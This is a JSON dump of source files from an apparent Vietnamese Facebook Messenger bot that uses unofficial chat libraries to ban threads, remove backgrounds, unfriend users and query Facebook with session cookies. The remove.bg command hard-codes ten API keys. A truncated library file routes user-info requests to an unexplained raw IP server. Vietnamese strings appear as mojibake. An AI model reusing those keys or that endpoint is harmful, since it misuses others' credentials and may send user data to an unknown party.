ID %1\",\n    \"unbanSuccess\": \"[ Unban Thread ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu g·ª° c·∫•m nh√≥m c√≥ ID %1\",\n    \"banCommandSuccess\": \"[ banCommand Thread ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu c·∫•m l·ªánh ƒë·ªëi v·ªõi nh√≥m c√≥ ID %1\",\n    \"unbanCommandSuccess\": \"[ UnbanCommand Thread ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu g·ª° c·∫•m %1 ƒë·ªëi v·ªõi nh√≥m c√≥ ID %2\",\n    \"errorReponse\": \"%1 Kh√¥ng th·ªÉ ho√†n t·∫•t c√¥ng vi·ªác b·∫°n y√™u c·∫ßu ƒë·ªëi v·ªõi nh√≥m c√≥ ID %2\",\n    \"IDNotFound\": \"%1 ID b·∫°n nh·∫≠p kh√¥ng t·ªìn t·∫°i trong c∆° s·ªü d·ªØ li·ªáu\",\n    \"existBan\": \"[ Ban Thread ] ID %1 ƒë√£ b·ªã ban t·ª´ tr∆∞·ªõc %2 %3\",\n    \"notExistBan\": \"[ Unban Thread ] ID b·∫°n nh·∫≠p ch∆∞a t·ª´ng b·ªã c·∫•m s·ª≠ d·ª•ng bot\",\n    \"missingCommandInput\": \"%1 Ph·∫ßn command c·∫ßn c·∫•m kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng!\",\n    \"notExistBanCommand\": \"[ UnbanCommand Thread ] Hi·ªán t·∫°i ID nh√≥m b·∫°n nh·∫≠p ch∆∞a t·ª´ng b·ªã c·∫•m s·ª≠ d·ª•ng l·ªánh\",\n\n    \"returnBan\": \"[ Ban Thread ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu c·∫•m nh√≥m:\\n- ID nh√≥m c·∫ßn c·∫•m: %1%2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnUnban\": \"[ Unban Thread ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu g·ª° c·∫•m nh√≥m:\\n- ID nh√≥m c·∫ßn g·ª° c·∫•m: %1\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnBanCommand\": \"[ banCommand Thread ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu c·∫•m s·ª≠ d·ª•ng l·ªánh ƒë·ªëi v·ªõi nh√≥m:\\n - ID nh√≥m c·∫ßn c·∫•m: %1\\n- C√°c l·ªánh c·∫ßn c·∫•m: %2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n    \"returnUnbanCommand\": \"[ UnbanCommand Thread ] Hi·ªán t·∫°i b·∫°n ƒëang y√™u c·∫ßu g·ª° c·∫•m s·ª≠ d·ª•ng l·ªánh ƒë·ªëi v·ªõi nh√≥m:\\n - ID nh√≥m c·∫ßn g·ª° c·∫•m l·ªánh: %1\\n- C√°c l·ªánh c·∫ßn g·ª° c·∫•m: %2\\n\\n‚ùÆ Reaction tin nh·∫Øn n√†y ƒë·ªÉ x√°c th·ª±c ‚ùØ\",\n\n    \"returnResult\": \"ƒê√¢y l√† k·∫øt qu·∫£ ph√π h·ª£p: \\n\",\n    \"returnNull\": \"Kh√¥ng t√¨m th·∫•y k·∫øt qu·∫£ d·ª±a v√†o t√¨m ki·∫øm c·ªßa b·∫°n!\",\n    \"returnList\": \"[ Thread List ]\\nHi·ªán t·∫°i ƒëang c√≥ %1 nh√≥m b·ªã ban, d∆∞·ªõi ƒë√¢y l√† %2 nh√≥m\\n\\n%3\",\n    \"returnInfo\": \"[ Info Thread ] ƒê√¢y l√† m·ªôt s√¥ th√¥ng tin v·ªÅ nh√≥m b·∫°n c·∫ßn t√¨m:\\n- ID c·ªßa nh√≥m: %1n- C√≥ b·ªã ban?: %2 %3 %4\\n- B·ªã ban l·ªánh?: %5\"\n  },\n  \"en\": {\n    \"reason\": \"Reason\",\n    \"at\": \"At\",\n    \"allCommand\": \"All commands\",\n    \"commandList\": \"Commands\",\n    \"banSuccess\": \"[ Ban Thread ] Banned thread has  ID %1\",\n    \"unbanSuccess\": \"[ Unban Thread ] Unbanned thread has ID %1\",\n    \"banCommandSuccess\": \"[ banCommand Thread ] Banned command with thread has  ID %1\",\n    \"unbanCommandSuccess\": \"[ unbanCommand Thread ] Unbanned %1 with thread has ID %2\",\n    \"errorReponse\": \"%1 Can't do what you request with thread has ID %2\",\n    \"IDNotFound\": \"%1 ID you import doesn't exist in database\",\n    \"existBan\": \"[ Ban Thread ] ID %1 has been banned before %2 %3\",\n    \"notExistBan\": \"[ Unban Thread ] ID you import hasn't been banned before bot\",\n    \"missingCommandInput\": \"%1 You have to import the command you want to ban!\",\n    \"notExistBanCommand\": \"[ UnbanCommand Thread ] The thread ID you import hasn't been banned before\",\n\n    \"returnBan\": \"[ Ban Thread ] You are requesting to ban thread:\\n- Thread ID: %1%2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnUnban\": \"[ Unban Thread ] You are requesting to unban thread:\\n- Thread ID: %1\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnBanCommand\": \"[ banCommand Thread ] You are requesting to ban command with thread:\\n - Thread ID: %1\\n- Commands: %2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n    \"returnUnbanCommand\": \"[ unbanCommand Thread ] You are requesting to unban command with thread:\\n - Thread ID: %1\\n- Commands: %2\\n\\n‚ùÆ Reaction this message to complete ‚ùØ\",\n\n    \"returnResult\": \"This is your result: \\n\",\n    \"returnNull\": \"There is no result with your input!\",\n    \"returnList\": \"[ Thread List ]\\There are %1 banned thread, here are %2\\n\\n%3\",\n    \"returnInfo\": \"[ Info Thread ] Here are some information about your thread which you want to search:\\n- Thread ID: %1n- Banned?: %2 %3 %4\\n- Command banned?: %5\"\n  }\n}\n\nmodule.exports.handleReaction = async ({ event, api, Threads, handleReaction, getText }) => {\n  if (parseInt(event.userID) !== parseInt(handleReaction.author)) return;\n  const moment = require(\"moment-timezone\");\n  const { threadID } = event;\n  const { messageID, type, targetID, reason, commandNeedBan } = handleReaction;\n\n  const time = moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:MM:ss L\");\n  global.client.handleReaction.splice(global.client.handleReaction.findIndex(item => item.messageID == messageID), 1);\n\n  switch (type) {\n    case \"ban\": {\n      try {\n        let data = (await Threads.getData(targetID)).data || {};\n        data.banned = true;\n        data.reason = reason || null;\n        data.dateAdded = time;\n        await Threads.setData(targetID, { data });\n        global.data.threadBanned.set(targetID, { reason: data.reason, dateAdded: data.dateAdded });\n        return api.sendMessage(getText(\"banSuccess\", targetID), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch { return api.sendMessage(getText(\"errorReponse\", \"[ Ban Thread ]\", targetID), threadID) };\n    }\n\n    case \"unban\": {\n      try {\n        let data = (await Threads.getData(targetID)).data || {};\n        data.banned = false;\n        data.reason = null;\n        data.dateAdded = null;\n        await Threads.setData(targetID, { data });\n        global.data.threadBanned.delete(targetID);\n        return api.sendMessage(getText(\"unbanSuccess\", targetID), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch { return api.sendMessage(getText(\"errorReponse\", \"[ unBan Thread ]\", targetID), threadID) };\n    }\n\n    case \"banCommand\": {\n      try {\t\n        let data = (await Threads.getData(targetID)).data || {};\n        data.commandBanned = [...data.commandBanned || [], ...commandNeedBan];\n        await Threads.setData(targetID, { data });\n        global.data.commandBanned.set(targetID, data.commandBanned);\n        return api.sendMessage(getText(\"banCommandSuccess\", targetID), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch (e) { return api.sendMessage(getText(\"errorReponse\", \"[ banCommand Thread ]\", targetID), threadID) };\n    }\n\n    case \"unbanCommand\": {\n      try {\n        let data = (await Threads.getData(targetID)).data || {};\n        data.commandBanned = [...data.commandBanned.filter(item => !commandNeedBan.includes(item))];\n        await Threads.setData(targetID, { data });\n        global.data.commandBanned.set(targetID, data.commandBanned);\n        if(data.commandBanned.length == 0) global.data.commandBanned.delete(targetID)\n        return api.sendMessage(getText(\"unbanCommandSuccess\", ((data.commandBanned.length == 0) ? getText(\"allCommand\") : `${getText(\"commandList\")}: ${commandNeedBan.join(\", \")}`), targetID), threadID, () => {\n          return api.unsendMessage(messageID);\n        });\n      } catch (e) { return api.sendMessage(getText(\"errorReponse\", \"[ unbanCommand Thread ]\", targetID), threadID) };\n    }\n    default:\n      break;\n  }\n}\n\nmodule.exports.run = async ({ event, api, args, Threads, getText }) => { \n  const { threadID, messageID } = event;\n  var targetID = String(args[1]);\n  var reason = (args.slice(2, args.length)).join(\" \") || null;\n\n  if (isNaN(targetID)) {\n    targetID = String(event.threadID);\n    reason = (args.slice(1, args.length)).join(\" \") || null;\n  }\n\n  switch (args[0]) {\n    case \"ban\":\n    case \"-b\": {\n      if (!global.data.allThreadID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ Ban Thread ]\"), threadID, messageID);\n      if (global.data.threadBanned.has(targetID)) {\n        const { reason, dateAdded } = global.data.threadBanned.get(targetID) || {};\n        return api.sendMessage(getText(\"existBan\", targetID, ((reason) ? `${getText(\"reason\")}: \"${reason}\"` : \"\"), ((dateAdded) ? `${getText(\"at\")}: ${dateAdded}` : \"\")), threadID, messageID);\n      }\n      return api.sendMessage(getText(\"returnBan\", targetID, ((reason) ? `\\n- ${getText(\"reason\")}: ${reason}` : \"\")), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"ban\",\n          targetID,\n          reason,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"unban\":\n    case \"-ub\": {\n      if (!global.data.allThreadID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ Unban Thread ]\"), threadID, messageID);\n      if (!global.data.threadBanned.has(targetID)) return api.sendMessage(getText(\"notExistBan\"), threadID, messageID);\n      return api.sendMessage(getText(\"returnUnban\", targetID), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"unban\",\n          targetID,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"banCommand\":\n    case \"-bc\": {\n      if (!global.data.allThreadID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ BanCommand Thread ]\"), threadID, messageID);\n      if (reason == null || reason.length == 0) return api.sendMessage(getText(\"missingCommandInput\", '[ BanCommand Thread ]'), threadID, messageID);\n      if (reason == \"all\") {\n        var allCommandName = [];\n        const commandValues = global.client.commands.keys();\n        for (const cmd of commandValues) allCommandName.push(cmd);\n        reason = allCommandName.join(\" \");\n      }\n      const commandNeedBan = reason.split(\" \");\n      return api.sendMessage(getText(\"returnBanCommand\", targetID, ((commandNeedBan.length == global.client.commands.size) ? getText(\"allCommand\") : commandNeedBan.join(\", \"))), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"banCommand\",\n          targetID,\n          commandNeedBan,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"unbanCommand\":\n    case \"-ubc\": {\n      if (!global.data.allThreadID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ UnbanCommand Thread ]\"), threadID, messageID);\n      if (!global.data.commandBanned.has(targetID)) return api.sendMessage(getText(\"notExistBanCommand\"), threadID, messageID);\n      if (reason == null || reason.length == 0) return api.sendMessage(getText(\"missingCommandInput\", \"[ UnbanCommand Thread ]\"), threadID, messageID);\n      if (reason == \"all\") {\n        reason = (global.data.commandBanned.get(targetID)).join(\" \");\n      }\n      const commandNeedBan = reason.split(\" \");\n      return api.sendMessage(getText(\"returnUnbanCommand\", targetID, ((commandNeedBan.length == global.data.commandBanned.get(targetID).length) ? \"to√†n b·ªô l·ªánh\" : commandNeedBan.join(\", \"))), threadID, (error, info) => {\n        global.client.handleReaction.push({\n          type: \"unbanCommand\",\n          targetID,\n          commandNeedBan,\n          name: this.config.name,\n          messageID: info.messageID,\n          author: event.senderID,\n\n        });\n      }, messageID);\n    }\n\n    case \"search\":\n    case \"-s\": {\n      const contentJoin = reason || \"\";\n      const getThreads =  (await Threads.getAll(['threadID', 'threadInfo'])).filter(item => !!item.threadInfo);\n      var matchThreads = [], a = '', b = 0;\n      getThreads.forEach(i => {\n        if ((i.threadInfo.threadName || \"\").toLowerCase().includes(contentJoin.toLowerCase())) {\n          matchThreads.push({\n            name: i.threadInfo.threadName,\n            id: i.threadID\n          });\n        }\n      });\n      matchThreads.forEach(i => a += `\\n${b += 1}. ${i.name} - ${i.id}`);\n      (matchThreads.length > 0) ? api.sendMessage(getText(\"returnResult\", a), threadID) : api.sendMessage(getText(\"returnNull\"), threadID, messageID);\n      break;\n    }\n\n    case \"list\":\n    case \"-l\": {\n      var listBan = [], i = 0;\n      const threadData = global.data.threadBanned.keys();\n      for (; ;) {\n        if (i > global.data.threadBanned.size) break;\n        let idThread = String(threadData.next().value);\n        if (typeof idThread == \"undefined\") {\n          const nameThread = (await Threads.getData(idThread)).threadInfo.threadName || \"unknown\";\n          listBan.push(`${i+=1}/ ${idThread} - ${nameThread}`)\n        }\n        if (i == global.data.threadBanned.size || i == (parseInt(reason) || 10)) break;\n      }\n      return api.sendMessage(getText(\"returnList\",(global.data.threadBanned.size || 0), listBan.length, listBan.join(\"\\n\")), threadID, messageID);\n    }\n\n    case \"info\":\n    case \"-i\": {\n      if (!global.data.allThreadID.includes(targetID)) return api.sendMessage(getText(\"IDNotFound\", \"[ Info Thread ]\"), threadID, messageID);\n      if (global.data.commandBanned.has(targetID)) { var commandBanned = global.data.commandBanned.get(targetID) || [] };\n      if (global.data.threadBanned.has(targetID)) { var { reason, dateAdded } = global.data.threadBanned.get(targetID) || {} };\n      return api.sendMessage(getText(\"returnInfo\", targetID, ((!dateAdded) ? \"YES\" : \"NO\"), ((reason) ? `${getText(\"reason\")}: \"${reason}\"` : \"\"), ((dateAdded) ? `${getText(\"at\")}: ${dateAdded}` : \"\"), ((commandBanned) ? `YES: ${commandBanned.join(\", \")}` : \"NO\")), threadID, messageID);\n    }\n  }\n}","path":null,"size_bytes":14086,"size_tokens":null},"modules/commands/tachnen.js":{"content":"module.exports.config = {\n  name: 'tachnen',\n  version: '1.1.1',\n  hasPermssion: 0,\n  credits: 'adu',\n  description: 'T√°ch n·ªÅn',\n  commandCategory: 'C√¥ng c·ª•',\n  usages: 'Reply images or url images',\n  cooldowns: 2,\n  dependencies: {\n       'form-data': '',\n       'image-downloader': ''\n    }\n};\n\nconst axios = require('axios');\nconst FormData = require('form-data');\nconst fs = require('fs-extra');\nconst path = require('path');\nconst {image} = require('image-downloader');\nmodule.exports.run = async function({\n    api, event, args\n}){\n    try {\n      var tpk = `üñºÔ∏è=== [ ùóßùóîÃÅùóñùóõ ùêçùêÑÃÇÃÄùêç ] ===üñºÔ∏è\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n‚ûú ùóßùóÆÃÅùó∞ùóµ ùòÅùóµùóÆÃÄùóªùóµ ùó∞ùóºÃÇùóªùó¥ ùóªùó≤ÃÇÃÄùóª ùó∞ùòÇÃâùóÆ ùóÆÃâùóªùóµ ùóØùóÆÃ£ùóª ùòÉùòÇÃõÃÄùóÆ ùóøùó≤ùóΩùóπùòÜ`;\n        if (event.type !== \"message_reply\") return api.sendMessage(\"‚ûú B·∫°n ph·∫£i reply m·ªôt ·∫£nh n√†o ƒë√≥\", event.threadID, event.messageID);\n        if (!event.messageReply.attachments || event.messageReply.attachments.length == 0) return api.sendMessage(\"‚ûú B·∫°n ph·∫£i reply m·ªôt ·∫£nh n√†o ƒë√≥\", event.threadID, event.messageID);\n        if (event.messageReply.attachments[0].type != \"photo\") return api.sendMessage(\"‚ûú ƒê√¢y kh√¥ng ph·∫£i l√† image\", event.threadID, event.messageID);\n\n        const content = (event.type == \"message_reply\") ? event.messageReply.attachments[0].url : args.join(\" \");\n        const KeyApi = [\"t4Jf1ju4zEpiWbKWXxoSANn4\",\"CTWSe4CZ5AjNQgR8nvXKMZBd\",\"PtwV35qUq557yQ7ZNX1vUXED\",\"wGXThT64dV6qz3C6AhHuKAHV\",\"82odzR95h1nRp97Qy7bSRV5M\",\"4F1jQ7ZkPbkQ6wEQryokqTmo\",\"4F1jQ7ZkPbkQ6wEQryokqTmo\",\"sBssYDZ8qZZ4NraJhq7ySySR\",\"NuZtiQ53S2F5CnaiYy4faMek\",\"f8fujcR1G43C1RmaT4ZSXpwW\"]\n        const inputPath = path.resolve(__dirname, 'cache', `photo.png`);\n         await image({\n        url: content, dest: inputPath\n    });\n        const formData = new FormData();\n        formData.append('size', 'auto');\n        formData.append('image_file', fs.createReadStream(inputPath), path.basename(inputPath));\n        axios({\n            method: 'post',\n            url: 'https://api.remove.bg/v1.0/removebg',\n            data: formData,\n            responseType: 'arraybuffer',\n            headers: {\n                ...formData.getHeaders(),\n                'X-Api-Key': KeyApi[Math.floor(Math.random() * KeyApi.length)],\n            },\n            encoding: null\n        })\n            .then((response) => {\n                if (response.status != 200) return console.error('Error:', response.status, response.statusText);\n                fs.writeFileSync(inputPath, response.data);\n                return api.sendMessage({body:tpk, attachment: fs.createReadStream(inputPath)},event.threadID, () => fs.unlinkSync(inputPath));\n            })\n            .catch((error) => {\n                return console.error('Request failed:', error);\n            });\n     } catch (e) {\n        console.log(e)\n        return api.sendMessage(`‚ûú L·ªói r·ªìi h√£y ki·ªÉm tra key api!!!`, event.threadID, event.messageID);\n  }\n};","path":null,"size_bytes":3083,"size_tokens":null},"lib/fca-auto/src/removeUserFromGroup.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function removeUserFromGroup(userID, threadID, callback) {\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) throw { error: \"please pass a threadID as a second argument.\" };\n    if (utils.getType(threadID) !== \"Number\" && utils.getType(threadID) !== \"String\") throw { error: \"threadID should be of type Number or String and not \" + utils.getType(threadID) + \".\" };\n    if (utils.getType(userID) !== \"Number\" && utils.getType(userID) !== \"String\") throw { error: \"userID should be of type Number or String and not \" + utils.getType(userID) + \".\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      uid: userID,\n      tid: threadID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/chat/remove_participants\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (!resData) throw { error: \"Remove from group failed.\" };\n\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"removeUserFromGroup\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1653,"size_tokens":null},"lib/fca-auto/Extra/Src/test.js":{"content":"const MemoryManager = require('./Release_Memory');\nconst path = require('path');\n\n// T·∫°o m·ªôt ƒë·ªëi t∆∞·ª£ng MemoryManager v·ªõi c√°c t√πy ch·ªçn c·∫•u h√¨nh t·ªëi ∆∞u\nconst memoryManager = new MemoryManager({\n  warningThreshold: 0.6, // Ng∆∞·ª°ng c·∫£nh b√°o s·ª≠ d·ª•ng b·ªô nh·ªõ (60%)\n  releaseThreshold: 0.7, // Ng∆∞·ª°ng gi·∫£i ph√≥ng b·ªô nh·ªõ (70%)\n  maxThreshold: 0.8, // Ng∆∞·ª°ng t·ªëi ƒëa s·ª≠ d·ª•ng b·ªô nh·ªõ (80%)\n  interval: 30000, // Kho·∫£ng th·ªùi gian ki·ªÉm tra b·ªô nh·ªõ (30 gi√¢y)\n  logLevel: 'warn', // Ch·ªâ ghi nh·∫≠t k√Ω khi c√≥ c·∫£nh b√°o ho·∫∑c l·ªói\n  logFile: path.join(__dirname, 'memory.log'), // T·ªáp nh·∫≠t k√Ω\n  smartReleaseEnabled: true, // B·∫≠t t√≠nh nƒÉng gi·∫£i ph√≥ng b·ªô nh·ªõ th√¥ng minh\n});\n\nmemoryManager.addMemoryUsageListener((memoryUsage) => {\n  console.log(`Memory released: ${(memoryUsage * 100).toFixed(2)}%`);\n});\n\n\n// B·∫Øt ƒë·∫ßu qu√° tr√¨nh qu·∫£n l√Ω b·ªô nh·ªõ t·ª± ƒë·ªông\nmemoryManager.autoStart(3600000); // 1 gi·ªù\n\n\n// L∆∞u tr·ªØ d·ªØ li·ªáu quan tr·ªçng trong WeakMap\nconst importantData = { sensitive: 'data' };\nmemoryManager.weakRefs.set('aaaaaaaaa', importantData);\n\nconsole.log(memoryManager.weakRefs.get('aaaaaaaaa'))","path":null,"size_bytes":1196,"size_tokens":null},"modules/commands/listbb.js":{"content":"module.exports.config = {\n  name: \"listbb\",\n  version: \"1.0.0\",\n  hasPermssion: 3,\n  credits: \"ManhG\",\n  description: \"Xem th√¥ng tin b·∫°n b√®/Xo√° b·∫°n b√® b·∫±ng c√°ch reply\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"\",\n  cooldowns: 5\n};\n\nmodule.exports.handleReply = async function ({ api, args, Users, handleReply, event, Threads }) {\n  const { threadID, messageID } = event;\n  if (parseInt(event.senderID) !== parseInt(handleReply.author)) return;\n\n  switch (handleReply.type) {\n    case \"reply\":\n      {\n        var msg =\"\" , name, urlUser, uidUser;\n        var arrnum = event.body.split(\" \");\n        var nums = arrnum.map(n => parseInt(n));\n        for (let num of nums) {\n          name = handleReply.nameUser[num - 1];\n          urlUser = handleReply.urlUser[num - 1];\n          uidUser = handleReply.uidUser[num - 1];\n\n          api.unfriend(uidUser);\n          msg += '- ' + name + '\\nüåêProfileUrl: ' + urlUser + \"\\n\";\n          //console.log(msg);\n        }\n\n        api.sendMessage(`üí¢Th∆∞Ã£c thi xo√° b·∫°n b√®üí¢\\n\\n${msg}`, threadID, () =>\n          api.unsendMessage(handleReply.messageID));\n      }\n      break;\n  }\n};\n\n\nmodule.exports.run = async function ({ event, api, args }) {\n  const { threadID, messageID, senderID } = event;\n  //var unfriend =  await api.unfriend();\n  try {\n    var listFriend = [];\n    var dataFriend = await api.getFriendsList();\n    var countFr = dataFriend.length;\n\n    for (var friends of dataFriend) {\n      listFriend.push({\n        name: friends.fullName || \"Ch∆∞a ƒë·∫∑t t√™n\",\n        uid: friends.userID,\n        gender: friends.gender,\n        vanity: friends.vanity,\n        profileUrl: friends.profileUrl\n      });\n    }\n    var nameUser = [], urlUser = [], uidUser = [];\n    var page = 1;\n    page = parseInt(args[0]) || 1;\n    page < -1 ? page = 1 : \"\";\n    var limit = 10;\n    var msg = `üé≠DS G·ªíM ${countFr} B·∫†N B√àüé≠\\n\\n`;\n    var numPage = Math.ceil(listFriend.length / limit);\n\n    for (var i = limit * (page - 1); i < limit * (page - 1) + limit; i++) {\n      if (i >= listFriend.length) break;\n      let infoFriend = listFriend[i];\n      msg += `${i + 1}. ${infoFriend.name}\\nüôá‚Äç‚ôÇÔ∏èID: ${infoFriend.uid}\\nüßè‚Äç‚ôÇÔ∏èGender: ${infoFriend.gender}\\n‚ùÑÔ∏èVanity: ${infoFriend.vanity}\\nüåêProfile Url: ${infoFriend.profileUrl}\\n\\n`;\n      nameUser.push(infoFriend.name);\n      urlUser.push(infoFriend.profileUrl);\n      uidUser.push(infoFriend.uid);\n    }\n    msg += `‚úéÔπèÔπèÔπèÔπèÔπèÔπèÔπèÔπèÔπèÔπè\\n--> Trang ${page}/${numPage} <--\\nD√πng .friend + s·ªë trang/all\\n\\n`;\n\n    return api.sendMessage(msg + 'üé≠Reply s·ªë th·ª© t·ª±, c√≥ th·ªÉ rep nhi·ªÅu s·ªë, c√°ch nhau b·∫±ng d·∫•u c√°ch ƒë·ªÉ xo√° b·∫°n b√® ƒë√≥ kh·ªèi danh s√°ch!', event.threadID, (e, data) =>\n      global.client.handleReply.push({\n        name: this.config.name,\n        author: event.senderID,\n        messageID: data.messageID,\n        nameUser,\n        urlUser,\n        uidUser,\n        type: 'reply'\n      })\n    )\n  }\n  catch (e) {\n    return console.log(e)\n  }\n}","path":null,"size_bytes":3037,"size_tokens":null},"modules/commands/listqtv.js":{"content":"module.exports.config = {\n    name: 'listqtv',\n    version: '1.0.0',\n    hasPermssion: 0,\n    credits: 'manhIT',\n    description: 'Danh s√°ch qu·∫£n tr·ªã vi√™n Box',\n    commandCategory: 'Nh√≥m',\n    usages: 'listqtv',\n    cooldowns: 5,\n    dependencies: []\n};\n\nmodule.exports.run = async function({ api, event, args, Users }) {\n    var threadInfo = await api.getThreadInfo(event.threadID);\n    let qtv = threadInfo.adminIDs.length;\n    var listad = '';\n    var qtv2 = threadInfo.adminIDs;\n    var fs = global.nodemodule[\"fs-extra\"];\n    dem = 1;\n    for (let i = 0; i < qtv2.length; i++) {\n        const info = (await api.getUserInfo(qtv2[i].id));\n        const name = info[qtv2[i].id].name;\n        listad += '' + `${dem++}` + '. ' + name + '\\n';\n    }\n    api.sendMessage(\n        `Danh s√°ch ${qtv} qu·∫£n tr·ªã vi√™n g·ªìm:\\n${listad}`,\n        event.threadID,\n        event.messageID\n    );\n};\n","path":null,"size_bytes":901,"size_tokens":null},"lib/fca-auto/src/getFacebookInfo.js":{"content":"\"use strict\";\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function getFacebookInfo(url, callback) {\n    var resolveFunc = () => {};\n    var rejectFunc = () => {};\n    var returnPromise = new Promise((resolve, reject) => {\n      resolveFunc = resolve;\n      rejectFunc = reject; \n    });\n\n    if (!callback) {\n      callback = (err, data) => {\n        if (err) return rejectFunc(err);\n        resolveFunc(data); \n      };\n    }\n\n    function extractID(url) {\n      const patterns = [\n        /(?:photos|videos|posts|stories)(?:\\/|%2F)(\\d+)/i,\n        /fbid=(\\d+)/i,\n        /\\/(\\d+)/\n      ];\n      \n      for (let pattern of patterns) {\n        let match = url.match(pattern);\n        if (match) return match[1];\n      }\n      return null;\n    }\n\n    const form = {\n      doc_id: \"5587632691339264\",\n      variables: JSON.stringify({\n        feedbackSource: 0,    \n        id: extractID(url),\n        scale: 1\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(res => {\n        if (!res.data) throw {error: \"Invalid response\"};\n        \n        let info = {\n          id: res.data.node.id,\n          text: res.data.node.message?.text,\n          media: res.data.node.attachments?.map(att => ({\n            type: att.media.__typename,\n            url: att.media.playable_url || att.media.image?.uri\n          })) || [],\n          author: {\n            id: res.data.node.author?.id,\n            name: res.data.node.author?.name\n          }\n        };\n\n        return callback(null, info);\n      })\n      .catch(callback);\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":1753,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/httpGet.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function httpGet(url, form, callback, notAPI) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(form) == \"Function\" || utils.getType(form) == \"AsyncFunction\")) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n\n    callback = callback || function (err, data) {\n      if (err) return rejectFunc(err);\n      resolveFunc(data);\n    };\n\n    if (notAPI) {\n      utils\n        .get(url, ctx.jar, form, ctx.globalOptions)\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpGet\", err);\n          return callback(err);\n        });\n    }\n    else {\n      defaultFuncs\n        .get(url, ctx.jar, form)\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpGet\", err);\n          return callback(err);\n        });\n    }\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1241,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/Dev_Horizon_Data.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar bluebird = require('bluebird');\nvar request = bluebird.promisify(require(\"request\"));\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function getUserInfoV4(data, type, method, callback) {\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n    \n        if (!callback) {\n            callback = function (err, userInfo) {\n                if (err) return rejectFunc(err);\n                resolveFunc(userInfo);\n            };\n        }\n\n        if (!data || !type || !method) return;\n\n        var Cluster = ['http://146.190.109.182:3874'];\n        var ursl = Cluster[Math.floor(Math.random() * Cluster.length)];\n        \n        if (utils.getType(data) !== \"Array\") data = [data];\n        switch (method) {\n            case \"Post\": {\n                switch (type) {\n                    case \"Users\": {\n                        /* \n                        example\n                            Time:19/01/2023\n                            